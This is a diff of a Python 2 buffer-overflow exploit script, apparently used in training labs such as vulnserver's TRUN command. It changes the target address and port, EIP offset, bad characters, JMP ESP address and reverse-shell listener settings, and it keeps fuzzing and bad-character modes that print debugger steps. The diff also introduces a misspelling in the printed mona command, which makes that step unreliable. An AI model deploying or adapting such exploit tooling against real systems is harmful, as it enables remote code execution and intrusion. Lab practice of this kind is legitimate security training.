@@ -11,17 +11,17 @@ approx_offset = 0
 #Server response timeout
 timeout = 5
 #Add server IP address and port to connect
-addr = ('10.10.2.190',1337)
+addr = ('10.10.35.158',9999)
 #Add commands to send
-cmd = "OVERFLOW10 "
+cmd = "TRUN "
 lhost = "10.9.51.179"
 lport = "4444"
 
 #Default starting offset is 50, change to correct offset
-offset = 537
+offset = 524
 buffer = "A" * offset
-bad = "\x00\xa0\xad\xbe\xde\xef"
-esp = "\xbb\x11\x50\x62"
+bad = "\x00"
+esp = ""
 ################################################################################
 
 
@@ -132,10 +132,10 @@ if sys.argv[1] == 'fuzz':
 	print "Approximate offset is %s" % approx_offset
 	raw_input("Restart the program and press any key to send pattern")
 	find_offset(addr,cmd,full_pattern,approx_offset,timeout)
-	print "Add the exact EIP offset to the offset variable in the code"
+	print "Add the exact EIP offset to the offset variable in the code. Fuzzing completed. Run badchars module"
 
 if sys.argv[1] == 'badchars':
-	print "Run -> !mona config -set workingfolder c:\\mona\\%p "
+	print "Run -> !mona config -set workingfoldser c:\\mona\\%p "
 	print "Run -> !mona bytearray -b \"%s\" " % j
 	raw_input("Press any key to send the Badchar array")
 	find_badchars(addr,cmd,bad,offset,timeout)
